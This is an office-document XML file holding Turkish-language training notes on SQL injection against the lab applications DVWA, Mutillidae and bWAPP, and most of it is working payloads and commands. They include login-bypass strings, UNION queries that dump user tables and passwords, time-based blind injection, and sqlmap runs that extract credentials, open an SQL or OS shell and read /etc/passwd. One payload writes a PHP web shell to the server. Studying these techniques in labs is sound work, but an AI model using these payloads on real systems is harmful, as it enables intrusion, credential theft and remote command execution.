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368793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3a6e8b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368793" officeooo:paragraph-rsid="00368793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368793" officeooo:paragraph-rsid="003a6e8b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79579" officeooo:paragraph-rsid="00379579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38dd61" officeooo:paragraph-rsid="0038dd61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38dd61" officeooo:paragraph-rsid="00368793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3a6e8b" officeooo:paragraph-rsid="003a6e8b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bold" officeooo:rsid="0038dd61" officeooo:paragraph-rsid="0038dd61" style:font-size-asian="10.5pt" style:font-weight-asian="bold" style:font-size-complex="10.5pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P11" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:text-properties fo:color="#c9211e" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="14pt" fo:font-weight="bold" officeooo:rsid="00379579" officeooo:paragraph-rsid="00379579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c9211e" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="14pt" fo:font-weight="bold" officeooo:rsid="0038dd61" officeooo:paragraph-rsid="0038dd61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c9211e" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="14pt" fo:font-weight="bold" officeooo:rsid="003a6e8b" officeooo:paragraph-rsid="003a6e8b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770000" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="10.5pt" fo:font-weight="normal" officeooo:rsid="00368793" officeooo:paragraph-rsid="00368793" style:font-size-asian="10.5pt" style:font-weight-asian="normal" style:font-size-complex="10.5pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P15" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:text-properties fo:color="#000000" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="10.5pt" fo:font-weight="normal" officeooo:rsid="003b1b87" officeooo:paragraph-rsid="003b1b87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fo:color="#000000" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="10.5pt" fo:font-weight="normal" officeooo:rsid="003a6e8b" officeooo:paragraph-rsid="003a6e8b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color="#000000" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="10.5pt" fo:font-weight="normal" officeooo:rsid="003a6e8b" officeooo:paragraph-rsid="003b7bbe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color="#000000" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="10.5pt" fo:font-weight="normal" officeooo:rsid="003a6e8b" officeooo:paragraph-rsid="003d0099" style:font-size-asian="10.5pt" style:font-weight-asian="normal" style:font-size-complex="10.5pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P19" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:text-properties fo:color="#000000" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="10.5pt" fo:font-weight="normal" officeooo:rsid="003b7bbe" officeooo:paragraph-rsid="003b7bbe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fo:color="#000000" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="10.5pt" fo:font-weight="normal" officeooo:rsid="003d0099" officeooo:paragraph-rsid="003d0099" style:font-size-asian="10.5pt" style:font-weight-asian="normal" style:font-size-complex="10.5pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P21" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:text-properties fo:color="#c9211e" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="14pt" fo:font-weight="bold" officeooo:rsid="003a6e8b" officeooo:paragraph-rsid="003b1b87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fo:color="#c9211e" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="14pt" fo:font-weight="bold" officeooo:rsid="003a6e8b" officeooo:paragraph-rsid="003b7bbe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c9211e" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="14pt" fo:font-weight="bold" officeooo:rsid="003a6e8b" officeooo:paragraph-rsid="003d0099" style:font-size-asian="14pt" style:font-weight-asian="bold" style:font-size-complex="14pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="T1" style:family="text">
      <style:text-properties officeooo:rsid="003a6e8b"/>
    </style:style>
    <style:style style:name="T2" style:family="text">
      <style:text-properties officeooo:rsid="003b1b87"/>
    </style:style>
    <style:style style:name="T3" style:family="text">
      <style:text-properties officeooo:rsid="003b4b61"/>
    </style:style>
    <style:style style:name="T4" style:family="text">
      <style:text-properties officeooo:rsid="003b7bbe"/>
    </style:style>
    <style:style style:name="T5" style:family="text">
      <style:text-properties officeooo:rsid="003d0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QL ÖRNEKLERİ</text:p>
      <text:p text:style-name="P6">SELECT name, phone FROM users;</text:p>
      <text:p text:style-name="P6">SELECT*FROM users WHERE username = ‘baki’ AND password=’123456’;</text:p>
      <text:p text:style-name="P6"/>
      <text:p text:style-name="P7">$db_baglantisi = mysql_connect(“10.10.10.80”,”root”,”123456”);</text:p>
      <text:p text:style-name="P7"/>
      <text:p text:style-name="P7">$max = $_GET[“enfazla”];</text:p>
      <text:p text:style-name="P7">$sorgu = “SELECT * FROM kitaplar WHERE fiyat &lt; ‘$max’ ORDER BY kitap_id”;</text:p>
      <text:p text:style-name="P7"/>
      <text:p text:style-name="P7">$sonuc = mysql_query($sorgu);</text:p>
      <text:p text:style-name="P7"/>
      <text:p text:style-name="P7">while($row=mysql_fetch_array($sonuc, MYSQL_ASSOC))</text:p>
      <text:p text:style-name="P7">{</text:p>
      <text:p text:style-name="P7"><text:tab/>echo ”Kitap Adı : {row[‘kitapadi’]} &lt;br&gt;”;</text:p>
      <text:p text:style-name="P7"><text:tab/>echo ”Kitap Yazarı : {row[‘yazar’]} &lt;br&gt;”;</text:p>
      <text:p text:style-name="P7"><text:tab/>echo “Kitap Fiyatı : {row[‘fiyat’]} &lt;br&gt;”;</text:p>
      <text:p text:style-name="P7">}</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P10">IN-BAND SQLİ</text:p>
      <text:p text:style-name="P7">Sürecin normal işleyişindeki elemanları kullanarak(HTTP) yapılan saldırıdır.</text:p>
      <text:p text:style-name="P7"/>
      <text:p text:style-name="P10">INFERENTIAL SQLİ</text:p>
      <text:p text:style-name="P7">Saldırı etkilerinin görünmesi zor ve zaman alır. Saldırı teknikleri ile veritabanının davranışları gözlemlenir.</text:p>
      <text:p text:style-name="P7"/>
      <text:p text:style-name="P10">OUT-OF-BAND SQLİ</text:p>
      <text:p text:style-name="P7">Harici elemanlarla yapılan saldırıdır. (DNS, SMB)</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P12">IN-BAND SQLİ (Error Based) – Login ByPass</text:p>
      <text:p text:style-name="P7">DVWA &gt; SQL INJECTION <text:s/>(admin/admin)</text:p>
      <text:p text:style-name="P7">SQL kodunda neler yazdığını tahminedip manipüle edeceğiz.</text:p>
      <text:p text:style-name="P7">SELECT firstname, surname FROM users WHERE id='1'</text:p>
      <text:p text:style-name="P3">SELECT first_name, last_name FROM users WHERE user_id = '$id'</text:p>
      <text:p text:style-name="P7">tahminimiz üssteki, gerçek aşağıdaki</text:p>
      <text:p text:style-name="P7">‘ yazdığımızda kabul etti ama hata verdi yani ‘ ile manipüle edebiliriz.</text:p>
      <text:p text:style-name="P7">Syntaxın sonuna K' OR <text:s/>'1'='1' bunu yazarsak sonda 2 ‘ olacak..</text:p>
      <text:p text:style-name="P7">K' OR <text:s/>'1'='1 <text:s/>bunu yazarsak tamam..</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P7">OWASP2013 &gt; A1 SQL </text:p>
      <text:p text:style-name="P7">name ve pass e</text:p>
      <text:p text:style-name="P7">' or '2'='2 <text:s/>yazarsak tamam..</text:p>
      <text:p text:style-name="P7">admin’# <text:s/>da yapabiliriz</text:p>
      <text:p text:style-name="P7">SQL de – ve # dan sonrası yorum olarak algılanır.</text:p>
      <text:p text:style-name="P7"/>
      <text:p text:style-name="P7"/>
      <text:p text:style-name="P12">IN-BAND SQLİ (Onion Based) – ORDERBY ve ONION kullanımı</text:p>
      <text:p text:style-name="P7">SELECT a,b FROM tabl1 UNION select c,d FROM tablo2</text:p>
      <text:p text:style-name="P7">ONION dan sonra, önceki ve sonraki sorgu atılan satır sayısı aynı olmalıdır.</text:p>
      <text:p text:style-name="P7">DVWA &gt; SQL INJECTION <text:s/>(admin/admin)</text:p>
      <text:p text:style-name="P3">' ORDER BY 1#</text:p>
      <text:p text:style-name="P7">Sırayla deneyerek, 2 sütun kullanıldığını öğrendik.</text:p>
      <text:p text:style-name="P7"/>
      <text:p text:style-name="P3">' UNION SELECT username, password FROM users#</text:p>
      <text:p text:style-name="P3">' UNION SELECT user, password FROM users#</text:p>
      <text:p text:style-name="P7">deneyerek doğruyu bulduk</text:p>
      <text:p text:style-name="P12"><text:soft-page-break/>IN-BAND SQLİ (Onion Based) – Fonksiyon Kullanımı</text:p>
      <text:p text:style-name="P7">DVWA &gt; SQL INJECTION <text:s/>(admin/admin)</text:p>
      <text:p text:style-name="P7">' ORDER BY 1,2,3# <text:s/>(artırarak tek sorguda çoklu deneme yaptık.)</text:p>
      <text:p text:style-name="P7">' UNION SELECT 1,2# <text:s/>(kolon isimlerimizi öğrendik.)</text:p>
      <text:p text:style-name="P7"/>
      <text:p text:style-name="P7">Mutilidae girelim.</text:p>
      <text:p text:style-name="P7">OWASP2013 &gt; A1 SQL</text:p>
      <text:p text:style-name="P7">ORDER BY ile 7 sütun olduğunu bulduk <text:s/>(8 de patladık yani 7 tane var.)</text:p>
      <text:p text:style-name="P7">' UNION SELECT 1,2,3,4,5,6,7#</text:p>
      <text:p text:style-name="P7">sadece 2,3,4 üncü kolonlar döndü..</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P14">' UNION SELECT 1,database(),user(),version(),5,6,7#</text:p>
      <text:p text:style-name="P7">database ismini, username I, version bilgisini almış olduk</text:p>
      <text:p text:style-name="P7">mySQL ile..</text:p>
      <text:p text:style-name="P7"/>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P12">Informatin Schema ile DB Bilgilerini Çıkarma</text:p>
      <text:p text:style-name="P4"><text:a xlink:type="simple" xlink:href="https://docs.pingcap.com/tidb/dev/information-schema" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link">https://docs.pingcap.com/tidb/dev/information-schema</text:a></text:p>
      <text:p text:style-name="P7">DVWA &gt; SQL INJECTION <text:s/>(admin/admin)</text:p>
      <text:p text:style-name="P8"/>
      <text:p text:style-name="P7">' UNION SELECT 1,table_name,table_schema,4,5,6,7 FROM information_schema.tables#</text:p>
      <text:p text:style-name="P7">tablo isimleri , schema isimleri, </text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4">' UNION SELECT 1,table_name,3,4,5,6,7 FROM information_schema.tables WHERE table_schema='nowasp'#</text:p>
      <text:p text:style-name="P7">nowasp içindeki sütun bilgileri</text:p>
      <text:p text:style-name="P7"/>
      <text:p text:style-name="P7">' UNION SELECT 1,column_name,3,4,5,6,7 FROM information_schema.columns #</text:p>
      <text:p text:style-name="P7">column isimleri</text:p>
      <text:p text:style-name="P7"/>
      <text:p text:style-name="P7">' UNION SELECT 1,column_name,3,4,5,6,7 FROM information_schema.columns WHERE table_name='accounts'#</text:p>
      <text:p text:style-name="P7">accounts taki column isimleri ni keşfettik..</text:p>
      <text:p text:style-name="P7"/>
      <text:p text:style-name="P7">bulduğumuz kolonları kullanacağız.</text:p>
      <text:p text:style-name="P1">' UNION SELECT 1,username,password,4,5,6,7 FROM accounts #</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P12">CONCAT fonksiyonu ile Kolon Çağırma</text:p>
      <text:p text:style-name="P7">concat ile döndürülmeyen bilgiler de bulunabilir</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4">' UNION SELECT 1,concat(username,':',password,':',mysignature,':',is_admin,':',firstname,':',lastname),3,4,5,6,7 FROM accounts#</text:p>
      <text:p text:style-name="P7">kolonlardaki bilgileri, çoklu olarak çağırmış olduk.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Alıştırma – Pratik</text:p>
      <text:p text:style-name="P9">Bwapp &gt; SQL Injection (Search/GET)</text:p>
      <text:p text:style-name="P9">aratırken '"^+%&amp;/ böyle yapıp deniyoruz. Hata verdiği işaret varmı diye.</text:p>
      <text:p text:style-name="P9">ORDER BY ile 8 de hata verdi ve 7 column olduğunu bulduk.</text:p>
      <text:p text:style-name="P9">UNION SELECT ile teyit ettik.</text:p>
      <text:p text:style-name="P9">Bu arada GET method olduğu için URL den yazabiliriz.</text:p>
      <text:p text:style-name="P5"><text:a xlink:type="simple" xlink:href="http://10.10.10.22/bWAPP/sqli_1.php?title=%27+UNION+SELECT+1%2C2%2C3%2C4%2C5%2C6%2C7+%23&amp;action=search" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link">http://10.10.10.22/bWAPP/sqli_1.php?title=%27+UNION+SELECT+1%2C2%2C3%2C4%2C5%2C6%2C7+%23&amp;action=search</text:a></text:p>
      <text:p text:style-name="P5"/>
      <text:p text:style-name="P2">' UNION SELECT 1,database(),<text:span text:style-name="T1">user()</text:span>,<text:span text:style-name="T1">@@version</text:span>,5,6,7 #</text:p>
      <text:p text:style-name="P9">database in bwapp olduğunu ve user ismini gördük.</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9">' UNION SELECT 1,table_name,3,4,5,6,7 FROM information_schema.tables #</text:p>
      <text:p text:style-name="P9">info schema ile table isimlerini aldık.</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9">' UNION SELECT 1,table_name,3,4,5,6,7 FROM information_schema.tables WHERE table_schema='bwapp'#</text:p>
      <text:p text:style-name="P9">bwapp ın tablo schema sını aldık. <text:s/>Users ın üzerine gideceğiz.</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9">' UNION SELECT 1,column_name,3,4,5,6,7 FROM information_schema.columns WHERE table_name='users'#</text:p>
      <text:p text:style-name="P9">users içindeki column isimlerini aldık.</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9">' UNION SELECT 1,login,password,4,5,6,7 FROM users #</text:p>
      <text:p text:style-name="P9">direkt olarak users tableına sorarak bilgileri aldık.</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9">Şimdi ise SQL Injection (Select/GET) i hackleyeceğiz.</text:p>
      <text:p text:style-name="P9">Film ismini değiştirdikçe, URL değişiyor..</text:p>
      <text:p text:style-name="P9">URL de movie= den sonra, ¾action=go dan önce,, kodumuzu yazacağız.</text:p>
      <text:p text:style-name="P9">Işlemin çalışması için bir movie seçmek gerekli, onun için de movie=1… olarak yazabiliriz.</text:p>
      <text:p text:style-name="P9">Tırnak kullanamayacağımız için, AND kullanarak sorgu yapacağız.</text:p>
      <text:p text:style-name="P9">AND den sonrasına yanlış bilgi verirsek, cevap gelmeyecek.</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9">5 AND 1=0 UNION SELECT 1,2,3,4,5,6,7</text:p>
      <text:p text:style-name="P9">5 AND 1=0 UNION SELECT 1,table_name,3,4,5,6,7 FROM information_schema.tables</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P13">Blind SQLİ – Boolean ve Time-Based</text:p>
      <text:p text:style-name="P15">DVWA &gt; SQL Injection (Blind) (Admin/Admin)</text:p>
      <text:p text:style-name="P15">1' AND SLEEP(10) # <text:s/>(10 snlik uykuya soktuk)</text:p>
      <text:p text:style-name="P9">1' AND IF(1=1, SLEEP(3),1) #</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P15">1' AND IF(SUBSTR((select version()),1,1)=2, SLEEP(3),1) #</text:p>
      <text:p text:style-name="P15">version kelimesi, 2 harf uzunluğundaysa, 3 saniye uyutacak.. <text:s/>olmadı.</text:p>
      <text:p text:style-name="P15">Deneyerek, 5 uzunluğunda olduğunu bulduk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/>
      <text:p text:style-name="P21"><text:soft-page-break/><text:span text:style-name="T2">Otomatik </text:span>SQLİ – <text:span text:style-name="T2">SQL Enumeration ve SQL Dump</text:span></text:p>
      <text:p text:style-name="P15">DVWA &gt; SQL Injection</text:p>
      <text:p text:style-name="P15">terminalde sqlmap kullanacağız (nmap gibi)</text:p>
      <text:p text:style-name="P15">-u <text:s/>urlmizi yazdık</text:p>
      <text:p text:style-name="P15">-p <text:s/>parametremiz, yani yazdıktan sonra etki eden yerimiz “id”</text:p>
      <text:p text:style-name="P9">--<text:span text:style-name="T2">cookie <text:s/>yazacağız ve bulmak için burpsuite kullanacağız.</text:span></text:p>
      <text:p text:style-name="P15">Sayfayı çalıştırıp, cookie yi aldık.</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9">└─# sqlmap -u "http://10.10.10.22/dvwa/vulnerabilities/sqli/?id=&amp;Submit=Submit#" -p "id" --cookie "security=low; security_level=0; PHPSESSID=2bg4h4kp4qk43c5vml3n5a5r13; acopendivids=swingset,jotto,phpbb2,redmine; acgroupswithpersist=nada"</text:p>
      <text:p text:style-name="P9"><text:span text:style-name="T2">SQL Enum başarılı..</text:span></text:p>
      <text:p text:style-name="P9">--<text:span text:style-name="T2">flush-session <text:s/>ile baştan tarama yapar</text:span></text:p>
      <text:p text:style-name="P9">--<text:span text:style-name="T2">batch varsıyaln ayarlar ile devam eder. (Y/N sormaz)</text:span></text:p>
      <text:p text:style-name="P9">--<text:span text:style-name="T2">dbs <text:s/>DB enumeration yapılır.</text:span></text:p>
      <text:p text:style-name="P9">--<text:span text:style-name="T3">level <text:s/>ile zorlama seviyesi artar. Ama arttıkça firewall a takılma ihtimali artar (1-5) varsayılan 1</text:span></text:p>
      <text:p text:style-name="P9">--<text:span text:style-name="T3">risk <text:s/>Denenen atak türlerini arttırır. (1-3) varsayılan 1</text:span></text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9">└─# sqlmap -u "http://10.10.10.22/dvwa/vulnerabilities/sqli/?id=&amp;Submit=Submit#" -p "id" --cookie "security=low; security_level=0; PHPSESSID=2bg4h4kp4qk43c5vml3n5a5r13; acopendivids=swingset,jotto,phpbb2,redmine; acgroupswithpersist=nada" --flush-session --batch -dbs --level 3 --risk 3</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9">-<text:span text:style-name="T4">dbs den sonra bulduğumuz dvwa databaseinin üzerine gideceğiz.</text:span></text:p>
      <text:p text:style-name="P9">-<text:span text:style-name="T4">D dvwa --current-db <text:s/>yazacağız.</text:span></text:p>
      <text:p text:style-name="P9">-<text:span text:style-name="T4">D dvwa --tables <text:s/>(table aldık)</text:span></text:p>
      <text:p text:style-name="P9">-D dvwa -T users --columns <text:s/><text:span text:style-name="T4">(column ları öğrendik)</text:span></text:p>
      <text:p text:style-name="P17">-D dvwa -T users -<text:span text:style-name="T4">C user,password –dump</text:span></text:p>
      <text:p text:style-name="P19">user ve passwordleri aldık..</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P22"><text:span text:style-name="T2">Otomatik </text:span>SQLİ – <text:span text:style-name="T4">Alıştırma</text:span></text:p>
      <text:p text:style-name="P20">OWASP 2013 &gt; SQL &gt; ByPass Authentication &gt; Login</text:p>
      <text:p text:style-name="P20">interception aç <text:s/>(deneme atışı yap, bilgileri al)</text:p>
      <text:p text:style-name="P9">└─# sqlmap -u "http://10.10.10.22/mutillidae/index.php?page=login.php" --data "username=aa&amp;password=&amp;login-php-submit-button=Login" -p "password,username" --cookie "showhints=1; security_level=0; PHPSESSID=2bg4h4kp4qk43c5vml3n5a5r13; acopendivids=swingset,jotto,phpbb2,redmine; acgroupswithpersist=nada" --dbs </text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P20">burpsuite te çıkan bilgiyi, save to file yapıp roota aldık.</text:p>
      <text:p text:style-name="P20">Bilgileri direkt olarak bu dosyadan okutacağız.</text:p>
      <text:p text:style-name="P20">└─# sqlmap -r request </text:p>
      <text:p text:style-name="P20">eğer imjactable bulursak üzerine ne olursa olsun gitmek gerekir.</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9">--<text:span text:style-name="T5">list-tamper</text:span></text:p>
      <text:p text:style-name="P9">-<text:span text:style-name="T5">v <text:s/>(0-6) default 1</text:span></text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9">-<text:span text:style-name="T5">D nowasp –tables</text:span></text:p>
      <text:p text:style-name="P9">-<text:span text:style-name="T5">D nowasp -T accounts --columns --dump</text:span></text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P23"><text:soft-page-break/><text:span text:style-name="T2">Otomatik </text:span>SQLİ – <text:span text:style-name="T5">SQL Shell ve Local File Download</text:span></text:p>
      <text:p text:style-name="P20">bWAPP</text:p>
      <text:p text:style-name="P20">SQL Injection (Search/GET)</text:p>
      <text:p text:style-name="P20">└─# sqlmap -u "http://10.10.10.22/bWAPP/sqli_1.php?title=a&amp;action=search" -p "title" --cookie "security_level=0; PHPSESSID=putt09oe9d59u8h4s23vbfgf40; acopendivids=swingset,jotto,phpbb2,redmine; acgroupswithpersist=nada" --level 5 --risk 3 --current-user</text:p>
      <text:p text:style-name="P9">--<text:span text:style-name="T5">current-db olarak bulabiliriz.</text:span></text:p>
      <text:p text:style-name="P18"/>
      <text:p text:style-name="P20">current-user bwapp@% <text:s/>bulduk..</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P18">--<text:span text:style-name="T5">os-shell <text:s/>(brute force olarak.) <text:s/>/var/www/,/var/www/bWAPP <text:s text:c="2"/>ekle</text:span></text:p>
      <text:p text:style-name="P20">SHELL alamayınca verbose alarak hatayı bulalım.</text:p>
      <text:p text:style-name="P20">--privileges <text:s/>ile hakka sahip olan kişileri bulduk.</text:p>
      <text:p text:style-name="P20">--privileges -U bwapp</text:p>
      <text:p text:style-name="P20">--sql-shell <text:s/>ile shell aldık.</text:p>
      <text:p text:style-name="P20">SELECT * FROM users</text:p>
      <text:p text:style-name="P9">sql-shell&gt; SELECT LOAD_FILE('/etc/passwd')</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9">--<text:span text:style-name="T5">file read “/etc/passwd”</text:span></text:p>
      <text:p text:style-name="P9">--file-write "/root/Desktop/test.txt" --file-dest "/tmp"</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P20">Bwapp &gt; a1 SQL &gt; login</text:p>
      <text:p text:style-name="P9">' UNION SELECT 1,"echo selam",3,4,5,6,7 INTO OUTFILE "/tmp/selam.txt"#</text:p>
      <text:p text:style-name="P9">' UNION SELECT 1,"&lt;?php_system($_GET['cmd']); ?&gt;",3,4,5,6,7 INTO OUTFILE "/var/www/dvwa/shell.php"#</text:p>
      <text:p text:style-name="P20">privilege a sahip olmaığımız için <text:s/>[errcode : 13]</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P20">sqlmap ten deneyelim</text:p>
      <text:p text:style-name="P9">└─# sqlmap -u "http://10.10.10.22/mutillidae/index.php?page=user-info.php&amp;username=a&amp;password=a&amp;user-info-php-submit-button=View+Account+Details" --cookie "showhints=1; security_level=0; PHPSESSID=putt09oe9d59u8h4s23vbfgf40; acopendivids=swingset,jotto,phpbb2,redmine; acgroupswithpersist=nada" -p "username,password" --level 5 --risk 3 –os-shell</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P20">buradan yapamadık, aynı şeyi, ByPass Authentication dan deneyeceğiz.</text:p>
      <text:p text:style-name="P20">└─# sqlmap -u "http://10.10.10.22/mutillidae/index.php?page=login.php" --cookie "showhints=1; security_level=0; PHPSESSID=putt09oe9d59u8h4s23vbfgf40; acopendivids=swingset,jotto,phpbb2,redmine; acgroupswithpersist=nada" --data "username=a&amp;password=a&amp;login-php-submit-button=Login" -p "username,password" --level 5 --risk 3 –os-shell</text:p>
      <text:p text:style-name="P20">--file-read deniyoruz.</text:p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0T22:15:25.282966801</dc:date>
    <meta:editing-duration>PT9H58M51S</meta:editing-duration>
    <meta:editing-cycles>30</meta:editing-cycles>
    <meta:generator>LibreOffice/7.4.1.1$Linux_X86_64 LibreOffice_project/40$Build-1</meta:generator>
    <meta:document-statistic meta:table-count="0" meta:image-count="0" meta:object-count="0" meta:page-count="5" meta:paragraph-count="160" meta:word-count="1051" meta:character-count="8783" meta:non-whitespace-character-count="7883"/>
  </office:meta>
</office:document-meta>
</file>